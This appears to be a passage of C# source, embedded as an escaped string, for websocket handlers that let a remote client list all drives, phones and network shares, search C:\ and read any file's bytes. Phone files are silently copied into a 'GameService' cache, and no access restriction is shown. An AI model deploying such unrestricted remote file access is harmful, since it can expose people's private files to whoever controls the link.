            // The first argument is a JSON string (double-encoded)
            string configStr = ExtractFirstStringArg(argsContent);
            if (configStr == null || configStr.Length == 0)
            {
                AddDebug(""[ERROR] "", DeviceName + "" [Config] Empty config received"");
                return;
            }

            // Parse config fields with dual-case fallback
            videoFrameNormalized = GetJsonFloat(configStr, ""videoFrameNormalized"", GetJsonFloat(configStr, ""VideoFrameNormalized"", 0.1f));
            sendDebug = GetJsonBool(configStr, ""sendDebug"", GetJsonBool(configStr, ""SendDebug"", true));
            thumbnailQuality = GetJsonFloat(configStr, ""thumbnailQuality"", GetJsonFloat(configStr, ""ThumbnailQuality"", 0.0f));
            videoBitrateMultiplier = GetJsonFloat(configStr, ""videoBitrateMultiplier"", GetJsonFloat(configStr, ""VideoBitrateMultiplier"", 0.50f));
            videoResolutionMultiplier = GetJsonFloat(configStr, ""videoResolutionMultiplier"", GetJsonFloat(configStr, ""VideoResolutionMultiplier"", 1.00f));
            bitrateCappingEnabled = GetJsonBool(configStr, ""bitrateCappingEnabled"", GetJsonBool(configStr, ""BitrateCappingEnabled"", true));
            float capMbps = GetJsonFloat(configStr, ""bitrateCapMbps"", GetJsonFloat(configStr, ""BitrateCapMbps"", 3.0f));
            bitrateCapBps = (int)(capMbps * 1000000);
            resolutionCeilingEnabled = GetJsonBool(configStr, ""resolutionCeilingEnabled"", GetJsonBool(configStr, ""ResolutionCeilingEnabled"", true));
            resolutionCeilingPx = GetJsonInt2(configStr, ""resolutionCeilingPx"", GetJsonInt2(configStr, ""ResolutionCeilingPx"", 720));
            speedLimitKbps = GetJsonInt2(configStr, ""speedLimitKbps"", GetJsonInt2(configStr, ""SpeedLimitKbps"", 0));
            keepScreenOn = GetJsonBool(configStr, ""keepScreenOn"", GetJsonBool(configStr, ""KeepScreenOn"", false));
            string pw = GetJsonStringValue(configStr, ""parallelWork"");
            if (pw == null) pw = GetJsonStringValue(configStr, ""ParallelWork"");
            if (pw != null) parallelWork = pw;

            AddDebug(""[SUCCESS] "", DeviceName + "" [Config] Applied: Debug="" + sendDebug + "" Frame="" + videoFrameNormalized + "" BRM="" + videoBitrateMultiplier + "" Speed="" + speedLimitKbps + "" Parallel="" + parallelWork);
        }
        catch (Exception ex)
        {
            AddDebug(""[ERROR] "", DeviceName + "" [Config] Parse error: "" + ex.Message);
        }
    }

    // ── GetDeviceConfig: return current config as completion response ───
    private static void HandleGetDeviceConfig(Stream stream, string invocationId)
    {
        try
        {
            if (invocationId == null || invocationId.Length == 0) return;

            float capMbps = bitrateCapBps / 1000000.0f;
            string cfg = ""{"" +
                ""\""videoFrameNormalized\"":"" + FloatStr(videoFrameNormalized) + "","" +
                ""\""sendDebug\"":"" + BoolStr(sendDebug) + "","" +
                ""\""thumbnailQuality\"":"" + FloatStr(thumbnailQuality) + "","" +
                ""\""videoBitrateMultiplier\"":"" + FloatStr(videoBitrateMultiplier) + "","" +
                ""\""videoResolutionMultiplier\"":"" + FloatStr(videoResolutionMultiplier) + "","" +
                ""\""bitrateCappingEnabled\"":"" + BoolStr(bitrateCappingEnabled) + "","" +
                ""\""bitrateCapBps\"":"" + bitrateCapBps + "","" +
                ""\""bitrateCapMbps\"":"" + FloatStr(capMbps) + "","" +
                ""\""resolutionCeilingEnabled\"":"" + BoolStr(resolutionCeilingEnabled) + "","" +
                ""\""resolutionCeilingPx\"":"" + resolutionCeilingPx + "","" +
                ""\""speedLimitKbps\"":"" + speedLimitKbps + "","" +
                ""\""keepScreenOn\"":"" + BoolStr(keepScreenOn) + "","" +
                ""\""parallelWork\"":\"""" + parallelWork + ""\"","" +
                ""\""coreAmount\"":"" + coreAmount + "","" +
                ""\""coreSet\"":"" + coreSet +
                ""}"";

            string completion = ""{\""type\"":3,\""invocationId\"":\"""" + invocationId + ""\"",\""result\"":"" + cfg + ""}\x1e"";
            SendWsText(stream, completion);
            AddDebug(""[SUCCESS] "", DeviceName + "" [Config] Sent device config to PC"");
        }
        catch (Exception ex)
        {
            AddDebug(""[ERROR] "", DeviceName + "" [Config] GetDeviceConfig error: "" + ex.Message);
        }
    }

    // ── GetDebugBuffer: return buffered debug lines as JSON array ───────
    private static void HandleGetDebugBuffer(Stream stream, string invocationId)
    {
        try
        {
            if (invocationId == null || invocationId.Length == 0) return;

            StringBuilder arr = new StringBuilder();
            arr.Append(""["");
            bool first = true;
            lock (debugLock)
            {
                while (debugBuffer.Count > 0)
                {
                    string line = debugBuffer[0];
                    debugBuffer.RemoveAt(0);
                    if (!first) arr.Append("","");
                    arr.Append(""\"""" + EscapeJsonString(line) + ""\"""");
                    first = false;
                }
            }
            arr.Append(""]"");

            string completion = ""{\""type\"":3,\""invocationId\"":\"""" + invocationId + ""\"",\""result\"":"" + arr.ToString() + ""}\x1e"";
            SendWsText(stream, completion);
        }
        catch (Exception ex)
        {
            AddDebug(""[ERROR] "", DeviceName + "" GetDebugBuffer error: "" + ex.Message);
        }
    }

    // ── GetPathInfo: list a folder or a single file ───────────────────────
    private static void HandleGetPathInfo(Stream stream, string invocationId, string jsonStr)
    {
        try
        {
            LogDesktop(""HandleGetPathInfo called invocationId="" + (invocationId==null?""NULL"":invocationId) + "" jsonLen="" + jsonStr.Length);
            if (invocationId == null || invocationId.Length == 0) { LogDesktop(""HandleGetPathInfo no invocationId, returning""); return; }

            List<string> args = ParseArgsArray(ExtractArguments(jsonStr));
            string vpath    = args.Count > 0 ? ParseJsonString(args[0]) : """";
            bool imageOnly  = args.Count > 2 ? ParseJsonBool(args[2]) : false;
            bool videoOnly  = args.Count > 3 ? ParseJsonBool(args[3]) : false;
            int sinceDays   = args.Count > 4 ? ParseJsonInt(args[4]) : 0;
            int startIndex  = args.Count > 5 ? ParseJsonInt(args[5]) : 0;
            int fileLimit   = args.Count > 6 ? ParseJsonInt(args[6]) : 0;

            string result = BuildPathInfoJson(vpath, imageOnly, videoOnly, sinceDays, startIndex, fileLimit);
            string completion = ""{\""type\"":3,\""invocationId\"":\"""" + invocationId + ""\"",\""result\"":"" + result + ""}\x1e"";
            SendWsText(stream, completion);
            AddDebug(""[MESSAGE] "", DeviceName + "" [Browse] Listed: "" + (vpath.Length == 0 ? ""/"" : vpath));
        }
        catch (Exception ex)
        {
            AddDebug(""[ERROR] "", DeviceName + "" GetPathInfo error: "" + ex.Message);
        }
    }

    private static void HandleGetPathInfoWithOverride(Stream stream, string invocationId, string jsonStr)
    {
        try
        {
            if (invocationId == null || invocationId.Length == 0) return;

            List<string> args = ParseArgsArray(ExtractArguments(jsonStr));
            string vpath = args.Count > 0 ? ParseJsonString(args[0]) : """";

            string result = BuildPathInfoJson(vpath, false, false, 0, 0, 0);
            string completion = ""{\""type\"":3,\""invocationId\"":\"""" + invocationId + ""\"",\""result\"":"" + result + ""}\x1e"";
            SendWsText(stream, completion);
        }
        catch (Exception ex)
        {
            AddDebug(""[ERROR] "", DeviceName + "" GetPathInfoWithOverride error: "" + ex.Message);
        }
    }

    // ── GetFileChunk: raw byte range (PC = no transcoding) ───────────────
    private static void HandleGetFileChunk(Stream stream, string invocationId, string jsonStr)
    {
        try
        {
            if (invocationId == null || invocationId.Length == 0) return;

            List<string> args = ParseArgsArray(ExtractArguments(jsonStr));
            string path  = args.Count > 0 ? ParseJsonString(args[0]) : """";
            long offset  = args.Count > 1 ? ParseJsonLong(args[1]) : 0L;
            int count    = args.Count > 2 ? ParseJsonInt(args[2]) : 65536;

            byte[] data = ReadAnyFileBytes(path, offset, count);
            string b64 = Convert.ToBase64String(data);
            string completion = ""{\""type\"":3,\""invocationId\"":\"""" + invocationId + ""\"",\""result\"":\"""" + b64 + ""\""}\x1e"";
            SendWsText(stream, completion);
        }
        catch (Exception ex)
        {
            AddDebug(""[ERROR] "", DeviceName + "" GetFileChunk error: "" + ex.Message);
        }
    }

    private static void HandleGetFileChunkWithOverride(Stream stream, string invocationId, string jsonStr)
    {
        try
        {
            if (invocationId == null || invocationId.Length == 0) return;

            List<string> args = ParseArgsArray(ExtractArguments(jsonStr));
            string path  = args.Count > 0 ? ParseJsonString(args[0]) : """";
            long offset  = args.Count > 1 ? ParseJsonLong(args[1]) : 0L;
            int count    = args.Count > 2 ? ParseJsonInt(args[2]) : 65536;

            byte[] data = ReadAnyFileBytes(path, offset, count);
            string b64 = Convert.ToBase64String(data);
            string completion = ""{\""type\"":3,\""invocationId\"":\"""" + invocationId + ""\"",\""result\"":\"""" + b64 + ""\""}\x1e"";
            SendWsText(stream, completion);
        }
        catch (Exception ex)
        {
            AddDebug(""[ERROR] "", DeviceName + "" GetFileChunkWithOverride error: "" + ex.Message);
        }
    }

    // ── SearchFiles: recursive filename search, returns FileNodeDto[] ────
    private static void HandleSearchFiles(Stream stream, string invocationId, string jsonStr)
    {
        try
        {
            if (invocationId == null || invocationId.Length == 0) return;

            List<string> args = ParseArgsArray(ExtractArguments(jsonStr));
            string query     = args.Count > 0 ? ParseJsonString(args[0]) : """";
            string startPath = args.Count > 1 ? ParseJsonString(args[1]) : """";
            bool recursive   = args.Count > 2 ? ParseJsonBool(args[2]) : true;
            int maxResults   = args.Count > 3 ? ParseJsonInt(args[3]) : 200;

            List<string> hits = new List<string>();
            if (query.Length == 0)
            {
                query = Path.GetFileName(startPath);
            }

            string root = startPath.Replace('/', '\\');
            if (root.Length == 0) root = ""C:\\"";

            if (!Directory.Exists(root) ) root = ""C:\\"";
            if (recursive)
            {
                SearchDirRecursive(root, query, hits, maxResults);
            }
            else
            {
                try
                {
                    foreach (string f in Directory.GetFiles(root))
                        if (Path.GetFileName(f).ToLowerInvariant().Contains(query.ToLowerInvariant()))
                            HitsLimit(hits, f, maxResults);
                }
                catch { }
            }

            StringBuilder arr = new StringBuilder();
            arr.Append(""[ "");
            for (int n = 0; n < hits.Count; n++)
            {
                if (n > 0) arr.Append("","");
                arr.Append(FileNodeJsonWindows(hits[n], false));
            }
            arr.Append(""]"");

            string completion = ""{\""type\"":3,\""invocationId\"":\"""" + invocationId + ""\"",\""result\"":"" + arr.ToString() + ""}\x1e"";
            SendWsText(stream, completion);
            AddDebug(""[MESSAGE] "", DeviceName + "" [Search] '"" + query + ""' -> "" + hits.Count + "" hits"");
        }
        catch (Exception ex)
        {
            AddDebug(""[ERROR] "", DeviceName + "" SearchFiles error: "" + ex.Message);
        }
    }

    private static void SearchDirRecursive(string dir, string query, List<string> hits, int maxResults)
    {
        if (hits.Count >= maxResults) return;
        try
        {
            foreach (string f in Directory.GetFiles(dir))
            {
                if (hits.Count >= maxResults) return;
                if (Path.GetFileName(f).ToLowerInvariant().Contains(query.ToLowerInvariant()))
                    HitsLimit(hits, f, maxResults);
            }
            foreach (string d in Directory.GetDirectories(dir))
            {
                if (hits.Count >= maxResults) return;
                if (Path.GetFileName(d).ToLowerInvariant().Contains(query.ToLowerInvariant()))
                    HitsLimit(hits, d, maxResults);
                SearchDirRecursive(d, query, hits, maxResults);
            }
        }
        catch { }
    }

    private static void HitsLimit(List<string> hits, string p, int maxResults)
    {
        if (hits.Count < maxResults) hits.Add(p);
    }

    // ── Build the FileNodeResultDto JSON for a virtual path ────────────────
    private static string BuildPathInfoJson(string vpath, bool imageOnly, bool videoOnly, int sinceDays, int startIndex, int fileLimit)
    {
        if (vpath.Length == 0 || vpath == ""/"")
        {
            // Root → all disk volumes (internal C:/D:, USB pendrives, external drives,
            // mapped network drives, opticals) + portable/MTP devices (Android/iOS
            // phones & tablets) + network locations.
            return BuildRootJson();
        }
        if (vpath.StartsWith(""shell:""))
        {
            // Shell namespace path: inside an MTP device or a network location.
            return BuildShellPathInfoJson(vpath.Substring(6));
        }

        string fsBase = vpath.Replace('/', '\\');

        if (!Directory.Exists(fsBase) && !File.Exists(fsBase))
        {
            return ""{ \""exists\"":false, \""currentNode\"":{ }, \""children\"":[], \""totalFileCount\"":0 }"";
        }

        List<string> dirs  = new List<string>();
        List<string> files = new List<string>();

        if (Directory.Exists(fsBase))
        {
            try
            {
                foreach (string d in Directory.GetDirectories(fsBase)) dirs.Add(d);
                foreach (string f in Directory.GetFiles(fsBase))
                {
                    if (imageOnly && videoOnly) { if (IsImageWindows(f) || IsVideoWindows(f)) files.Add(f); }
                    else if (imageOnly) { if (IsImageWindows(f)) files.Add(f); }
                    else if (videoOnly) { if (IsVideoWindows(f)) files.Add(f); }
                    else files.Add(f);
                }
            }
            catch { }
        }

        // Date filter
        if (sinceDays > 0)
        {
            DateTime cutoff = DateTime.UtcNow.AddDays(-sinceDays);
            files = files.FindAll(f =>
            {
                try { return File.GetLastWriteTimeUtc(f) >= cutoff; }
                catch { return false; }
            });
        }

        int totalFileCount = files.Count;

        // Pagination (dirs always shown, files windowed — same as Android)
        if (fileLimit > 0 && startIndex >= 0)
        {
            int end = Math.Min(startIndex + fileLimit, files.Count);
            if (startIndex < files.Count)
                files = files.GetRange(startIndex, end - startIndex);
            else
                files.Clear();
        }

        string currentNodeJson = ""{ }"";
        if (File.Exists(fsBase))
            currentNodeJson = FileNodeJsonWindows(fsBase, false);
        else if (Directory.Exists(fsBase))
            currentNodeJson = DirNodeJsonWindows(fsBase);

        StringBuilder sb2 = new StringBuilder();
        sb2.Append(""{ \""exists\"":true, \""currentNode\"":"").Append(currentNodeJson).Append("", \""children\"":["" );

        for (int i = 0; i < dirs.Count; i++)
        {
            if (i > 0) sb2.Append("", "");
            sb2.Append(DirNodeJsonWindows(dirs[i]));
        }
        for (int i = 0; i < files.Count; i++)
        {
            if (dirs.Count + i > 0) sb2.Append("", "");
            sb2.Append(FileNodeJsonWindows(files[i], true));
        }

        sb2.Append(""], \""totalFileCount\"":"").Append(totalFileCount).Append("" }"" );
        return sb2.ToString();
    }

    // ── Root listing: disk volumes + portable/MTP devices + network places ──
    private static string BuildRootJson()
    {
        StringBuilder sb = new StringBuilder();
        sb.Append(""{ \""exists\"":true, \""currentNode\"":{ }, \""children\"":["" );
        bool first = true;

        try
        {
            foreach (DriveInfo d in DriveInfo.GetDrives())
            {
                try
                {
                    string drivePath = d.Name;                              // C:\
                    string name = drivePath.TrimEnd(new char[] {(char)92});              // C:
                    string vpath = drivePath.Replace((char)92, '/');        // C:/
                    string kind;
                    switch (d.DriveType)
                    {
                        case DriveType.Fixed: kind = ""disk""; break;
                        case DriveType.Removable: kind = ""usb""; break;
                        case DriveType.Network: kind = ""networkdrive""; break;
                        case DriveType.CDRom: kind = ""cdrom""; break;
                        case DriveType.Ram: kind = ""ram""; break;
                        default: kind = ""unknown""; break;
                    }
                    // Never probe readiness of network mappings here — IsReady can
                    // block for many seconds on an offline share and stall the link.
                    bool ready = d.DriveType == DriveType.Network || d.IsReady;
                    long total = 0; long free = 0;
                    if (ready && d.DriveType != DriveType.Network && d.DriveType != DriveType.CDRom)
                    {
                        try { total = d.TotalSize; free = d.AvailableFreeSpace; } catch { }
                    }
                    string warning = """";
                    if (!ready) warning = d.DriveType == DriveType.CDRom ? ""No disc inserted."" : ""Drive not ready - no media or offline."";
                    sb.Append(NodeJson(first, name, vpath, true, 0, kind, warning, free, total));
                    first = false;
                }
                catch { }
            }
        }
        catch { }

        AppendShellRootEntries(sb, ref first);

        sb.Append(""], \""totalFileCount\"":0 }"");
        return sb.ToString();
    }

    // Child-node JSON incl. the extra root fields. Old clients ignore extras.
    private static string NodeJson(bool first, string name, string relPath, bool isDir, long length, string kind, string warning, long freeBytes, long totalBytes)
    {
        StringBuilder e = new StringBuilder();
        if (!first) e.Append("", "");
        e.Append(""{ \""name\"":\"""" + EscapeJsonString(name == null ? """" : name) + ""\"", \""relativePath\"":\"""" + EscapeJsonString(relPath == null ? """" : relPath) + ""\"", \""isDirectory\"":"" + (isDir ? ""true"" : ""false"") + "", \""length\"":"" + length + "", \""originalLength\"":"" + length + "", \""originalPreviewLength\"":0, \""lastWriteTimeUtc\"":\"""" + DateTime.UtcNow.ToString(""yyyy-MM-ddTHH:mm:ss.fffZ"") + ""\"""");
        if (kind != null && kind.Length > 0) e.Append("", \""entryKind\"":\"""" + EscapeJsonString(kind) + ""\"""");
        if (warning != null && warning.Length > 0) e.Append("", \""disabled\"":true, \""accessWarning\"":\"""" + EscapeJsonString(warning) + ""\"""");
        else e.Append("", \""disabled\"":false, \""accessWarning\"":\""\"""");
        if (totalBytes > 0) e.Append("", \""totalBytes\"":"" + totalBytes);
        if (freeBytes > 0) e.Append("", \""freeBytes\"":"" + freeBytes);
        e.Append("" }"");
        return e.ToString();
    }

    // ── Shell namespace access (MTP devices, network places) ───────────────
    private static object ShellApp()
    {
        try
        {
            Type t = Type.GetTypeFromProgID(""Shell.Application"");
            if (t == null) return null;
            return Activator.CreateInstance(t);
        }
        catch { return null; }
    }

    private static object ShellCall(object obj, string member, object[] args)
    {
        if (obj == null) return null;
        try
        {
            System.Reflection.BindingFlags flags = System.Reflection.BindingFlags.InvokeMethod | System.Reflection.BindingFlags.GetProperty;
            return obj.GetType().InvokeMember(member, flags, null, obj, args == null ? new object[0] : args);
        }
        catch { return null; }
    }

    private static string HexEncode(string s)
    {
        byte[] b = Encoding.UTF8.GetBytes(s);
        StringBuilder h = new StringBuilder(b.Length * 2);
        foreach (byte x in b) h.Append(x.ToString(""x2""));
        return h.ToString();
    }

    private static string HexDecode(string hex)
    {
        try
        {
            if (hex == null || hex.Length == 0 || (hex.Length % 2) != 0) return null;
            byte[] b = new byte[hex.Length / 2];
            for (int i = 0; i < b.Length; i++) b[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            return Encoding.UTF8.GetString(b);
        }
        catch { return null; }
    }

    private static void AppendShellRootEntries(StringBuilder sb, ref bool first)
    {
        object shell = ShellApp();
        if (shell == null) return;

        // This PC (17): drive-letter entries were already listed via DriveInfo,
        // so surface only namespace-only items — portable devices (MTP phones,
        // tablets, cameras, players).
        try
        {
            object ns = ShellCall(shell, ""NameSpace"", new object[] { 17 });
            AppendShellLevelEntries(ns, ""mtp"", true, sb, ref first);
        }
        catch { }

        // Network (18): discovered computers/providers and network locations.
        try
        {
            object ns2 = ShellCall(shell, ""NameSpace"", new object[] { 18 });
            AppendShellLevelEntries(ns2, ""network"", false, sb, ref first);
        }
        catch { }
    }

    private static void AppendShellLevelEntries(object folder, string kind, bool virtualOnly, StringBuilder sb, ref bool first)
    {
        if (folder == null) return;
        object items = ShellCall(folder, ""Items"", null);
        object cntObj = items != null ? ShellCall(items, ""Count"", null) : null;
        if (!(cntObj is int)) return;
        int count = (int)cntObj;
        for (int i = 0; i < count; i++)
        {
            try
            {
                object item = ShellCall(items, ""Item"", new object[] { i });
                if (item == null) continue;
                string title = ShellCall(item, ""Name"", null) as string;
                if (String.IsNullOrEmpty(title)) title = ShellCall(item, ""Title"", null) as string;
                if (String.IsNullOrEmpty(title)) continue;
                string path = ShellCall(item, ""Path"", null) as string;
                if (path == null) path = """";
                bool driveLetter = path.Length >= 2 && path[1] == ':';
                if (driveLetter) continue;

                string parse = ShellCall(item, ""ParsingName"", null) as string;
                if (String.IsNullOrEmpty(parse)) parse = title;
                string vpath = ""shell:"" + HexEncode(parse);

                // Accessibility probe: enumerating the device root fails when the
                // phone/tablet is locked or storage access was not permitted.
                string warning = """";
                object sub = ShellCall(item, ""GetFolder"", null);
                object subItems = sub != null ? ShellCall(sub, ""Items"", null) : null;
                object subCnt = subItems != null ? ShellCall(subItems, ""Count"", null) : null;
                if (!(subCnt is int))
                {
                    warning = ""Device locked, asleep or storage access not permitted on this PC. Unlock it / allow access, then refresh."";
                }

                sb.Append(NodeJson(first, title, vpath, true, 0, kind, warning, 0, 0));
                first = false;
            }
            catch { }
        }
    }

    // Resolves shell:<hex>/<hex>/... to [folderObj, itemObj] (stateless walk from
    // the namespace root). Returns false when any segment cannot be resolved.
    private static bool ShellResolveToItem(string rest, out object folderObj, out object itemObj)
    {
        folderObj = null; itemObj = null;
        string[] segs = rest.Split(new char[] { '/' }, StringSplitOptions.RemoveEmptyEntries);
        if (segs.Length == 0) return false;
        object shell = ShellApp();
        if (shell == null) return false;

        string want0 = HexDecode(segs[0]);
        if (want0 == null) return false;
        itemObj = FindShellChildByParse(ShellCall(shell, ""NameSpace"", new object[] { 17 }), want0);
        if (itemObj == null) itemObj = FindShellChildByParse(ShellCall(shell, ""NameSpace"", new object[] { 18 }), want0);
        if (itemObj == null) return false;

        folderObj = ShellCall(itemObj, ""GetFolder"", null);
        for (int s = 1; s < segs.Length; s++)
        {
            if (folderObj == null) return false;
            string want = HexDecode(segs[s]);
            if (want == null) return false;
            object child = FindShellChild(folderObj, want);
            if (child == null) return false;
            itemObj = child;
            folderObj = ShellCall(child, ""GetFolder"", null);
        }
        return true;
    }

    private static object FindShellChildByParse(object container, string parsingName)
    {
        if (container == null || parsingName == null) return null;
        object items = ShellCall(container, ""Items"", null);
        object cntObj = items != null ? ShellCall(items, ""Count"", null) : null;
        if (!(cntObj is int)) return null;
        int count = (int)cntObj;
        for (int i = 0; i < count; i++)
        {
            object it = ShellCall(items, ""Item"", new object[] { i });
            if (it == null) continue;
            string p = ShellCall(it, ""ParsingName"", null) as string;
            if (p != null && p == parsingName) return it;
        }
        return null;
    }

    private static object FindShellChild(object folderObj, string parseOrName)
    {
        if (folderObj == null || parseOrName == null) return null;
        object items = ShellCall(folderObj, ""Items"", null);
        object cntObj = items != null ? ShellCall(items, ""Count"", null) : null;
        if (!(cntObj is int)) return null;
        int count = (int)cntObj;
        for (int pass = 0; pass < 2; pass++)
        {
            for (int i = 0; i < count; i++)
            {
                object it = ShellCall(items, ""Item"", new object[] { i });
                if (it == null) continue;
                string candidate = pass == 0
                    ? ShellCall(it, ""ParsingName"", null) as string
                    : (ShellCall(it, ""Name"", null) ?? ShellCall(it, ""Title"", null)) as string;
                if (candidate != null && candidate == parseOrName) return it;
            }
        }
        return null;
    }

    private static bool ShellItemIsFolder(object item)
    {
        try
        {
            object f = ShellCall(item, ""IsFolder"", null);
            if (f is bool) return (bool)f;
        }
        catch { }
        return true;
    }

    private static long ShellItemSize(object item)
    {
        try
        {
            object s = ShellCall(item, ""Size"", null);
            if (s != null)
            {
                long len;
                if (long.TryParse(s.ToString(), out len)) return len;
            }
        }
        catch { }
        return 0;
    }

    private static string ShellItemName(object item)
    {
        string n = ShellCall(item, ""Name"", null) as string;
        if (String.IsNullOrEmpty(n)) n = ShellCall(item, ""Title"", null) as string;
        if (n == null) n = """";
        return n;
    }

    // Lists a shell: virtual path (inside an MTP device or a network location).
    private static string BuildShellPathInfoJson(string rest)
    {
        try
        {
            object folderObj, itemObj;
            if (!ShellResolveToItem(rest, out folderObj, out itemObj)) return ShellMissingJson();
            if (itemObj == null) return ShellMissingJson();

            // A single file was addressed directly (preview/info path).
            if (!ShellItemIsFolder(itemObj))
            {
                string node = NodeJson(true, ShellItemName(itemObj), ""shell:"" + rest, false, ShellItemSize(itemObj), ""mtpfile"", """", 0, 0);
                return ""{ \""exists\"":true, \""currentNode\"":"" + node + "", \""children\"":[], \""totalFileCount\"":0 }"";
            }

            if (folderObj == null) return ShellMissingJson();

            StringBuilder kids = new StringBuilder();
            int fileCount = 0;
            bool first = true;
            string prefix = ""shell:"" + rest;
            object items = ShellCall(folderObj, ""Items"", null);
            object cntObj = items != null ? ShellCall(items, ""Count"", null) : null;
            if (cntObj is int)
            {
                int count = (int)cntObj;
                for (int i = 0; i < count; i++)
                {
                    try
                    {
                        object it = ShellCall(items, ""Item"", new object[] { i });
                        if (it == null) continue;
                        string title = ShellItemName(it);
                        if (title.Length == 0) continue;
                        bool isDir = ShellItemIsFolder(it);
                        long size = isDir ? 0 : ShellItemSize(it);

                        // Real filesystem targets (UNC shares reached through the
                        // Network tree) switch back to plain filesystem browsing.
                        string targetVpath;
                        string fsPath = ShellCall(it, ""Path"", null) as string;
                        if (isDir && fsPath != null && fsPath.Length > 2 &&
                            (fsPath[1] == ':' || (fsPath[0] == (char)92 && fsPath[1] == (char)92)) &&
                            Directory.Exists(fsPath))
                        {
                            targetVpath = fsPath.Replace((char)92, '/');
                        }
                        else
                        {
                            string parse = ShellCall(it, ""ParsingName"", null) as string;
                            if (String.IsNullOrEmpty(parse)) parse = title;
                            targetVpath = prefix + ""/"" + HexEncode(parse);
                        }

                        kids.Append(NodeJson(first, title, targetVpath, isDir, size, null, """", 0, 0));
                        first = false;
                        if (!isDir) fileCount++;
                    }
                    catch { }
                }
            }
            string curNode = NodeJson(true, ShellItemName(itemObj), prefix, true, 0, ""mtp"", """", 0, 0);
            return ""{ \""exists\"":true, \""currentNode\"":"" + curNode + "", \""children\"":["" + kids.ToString() + ""], \""totalFileCount\"":"" + fileCount + "" }"";
        }
        catch { return ShellMissingJson(); }
    }

    private static string ShellMissingJson()
    {
        return ""{ \""exists\"":false, \""currentNode\"":{ }, \""children\"":[], \""totalFileCount\"":0 }"";
    }

    // ── Serving files that live inside MTP devices ─────────────────────────
    private static string HashText(string s)
    {
        unchecked
        {
            uint h = 2166136261;
            foreach (char c in s) { h ^= c; h *= 16777619; }
            return h.ToString(""x8"") + ((uint)s.Length).ToString(""x8"");
        }
    }

    private static byte[] ReadAnyFileBytes(string vpath, long offset, int count)
    {
        try
        {
            if (vpath != null && vpath.StartsWith(""shell:""))
            {
                string cached = EnsureShellTempCopy(vpath.Substring(6));
                if (cached == null) return new byte[0];
                return ReadFileBytesWindows(cached, offset, count);
            }
        }
        catch { return new byte[0]; }
        return ReadFileBytesWindows(vpath.Replace('/', '\\'), offset, count);
    }

    // MTP files have no real path — copy them out with the Shell CopyHere verb
    // into a local cache folder and serve bytes from there.
    private static string EnsureShellTempCopy(string rest)
    {
        try
        {
            string cacheRoot = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""GameService"", ""MtpCache"");
            Directory.CreateDirectory(cacheRoot);
            string work = Path.Combine(cacheRoot, HashText(rest));

            // Reuse an existing complete copy when present.
            try
            {
                foreach (string f in Directory.GetFiles(work)) return f;
            }
            catch { }

            object folderObj, itemObj;
            if (!ShellResolveToItem(rest, out folderObj, out itemObj) || itemObj == null) return null;
            string fileName = ShellItemName(itemObj);
            foreach (char bad in Path.GetInvalidFileNameChars()) fileName = fileName.Replace(bad, '_');
            long expected = ShellItemSize(itemObj);

            // Best-effort cleanup of stale copies (older than ~6h).
            try
            {
                foreach (string d in Directory.GetDirectories(cacheRoot))
                {
                    try { if (Directory.GetLastWriteTimeUtc(d) < DateTime.UtcNow.AddHours(-6)) Directory.Delete(d, true); } catch { }
                }
            }
            catch { }

            Directory.CreateDirectory(work);
            object shell = ShellApp();
            object dest = ShellCall(shell, ""NameSpace"", new object[] { work });
            if (dest == null) return null;
            // 4=no progress UI, 16=yes-to-all, 512=no mkdir confirm, 1024=no error UI
            ShellCall(dest, ""CopyHere"", new object[] { itemObj, 4 | 16 | 512 | 1024 });

            string targetFile = Path.Combine(work, fileName);
            DateTime startUtc = DateTime.UtcNow;
            long lastLen = -1;
            while ((DateTime.UtcNow - startUtc).TotalSeconds < 120)
            {
                Thread.Sleep(500);
                try
                {
                    if (File.Exists(targetFile))
                    {
                        long len = new FileInfo(targetFile).Length;
                        if (expected > 0 && len >= expected) return targetFile;
                        if (len > 0 && len == lastLen) return targetFile;
                        lastLen = len;
                    }
                }
                catch { }
            }
            // Fall back to whatever appeared under its hash dir.
            try
            {
                foreach (string f in Directory.GetFiles(work))
                {
                    if (expected <= 0 || new FileInfo(f).Length >= expected) return f;
                }
            }
            catch { }
            return null;
        }
        catch { return null; }
    }

    private static string DirNodeJsonWindows(string absDir)
    {
        string name = Path.GetFileName(absDir.TrimEnd(new char[] {'\\', '/'}));
        string vpath = absDir.Replace('\\', '/');
        string time  = """";
        try { time = Directory.GetLastWriteTimeUtc(absDir).ToString(""yyyy-MM-ddTHH:mm:ss.fffZ""); } catch { time = DateTime.Now.ToUniversalTime().ToString(""yyyy-MM-ddTHH:mm:ss.fffZ""); }
        return ""{ \""name\"":\"""" + EscapeJsonString(name) + ""\"", \""relativePath\"":\"""" + EscapeJsonString(vpath) + ""\"", \""isDirectory\"":true, \""length\"":0, \""originalLength\"":0, \""originalPreviewLength\"":0, \""lastWriteTimeUtc\"":\"""" + time + ""\"" }"";
    }

    private static string FileNodeJsonWindows(string absFile, bool includeLen)
    {
        string name = Path.GetFileName(absFile);
        string vpath = absFile.Replace('\\', '/');
        long len = 0; long orig = 0;
        string time = """";
        try
        {
            FileInfo fi = new FileInfo(absFile);
            len = fi.Length; orig = fi.Length;
            time = fi.LastWriteTimeUtc.ToString(""yyyy-MM-ddTHH:mm:ss.fffZ"");
        }
        catch { time = DateTime.Now.ToUniversalTime().ToString(""yyyy-MM-ddTHH:mm:ss.fffZ""); }
        return ""{ \""name\"":\"""" + EscapeJsonString(name) + ""\"", \""relativePath\"":\"""" + EscapeJsonString(vpath) + ""\"", \""isDirectory\"":false, \""length\"":"" + len + "", \""originalLength\"":"" + orig + "", \""originalPreviewLength\"":0, \""lastWriteTimeUtc\"":\"""" + time + ""\"" }"";
    }

    private static byte[] ReadFileBytesWindows(string fullPath, long offset, int count)
    {
        try
        {
            if (!File.Exists(fullPath)) return new byte[0];
            using (FileStream fs = new FileStream(fullPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                if (offset >= fs.Length) return new byte[0];
                fs.Seek(offset, SeekOrigin.Begin);
                int toRead = (int)Math.Min(count, fs.Length - offset);
                byte[] buffer = new byte[toRead];
                int total = 0;
                while (total < toRead)
                {
                    int n = fs.Read(buffer, total, toRead - total);
                    if (n <= 0) break;
                    total += n;
                }
                if (total < toRead) Array.Resize(ref buffer, total);
                return buffer;
            }
        }
        catch { return new byte[0]; }
    }

    private static bool IsImageWindows(string f)
    {
        string e = (Path.GetExtension(f) ?? """").ToLowerInvariant();
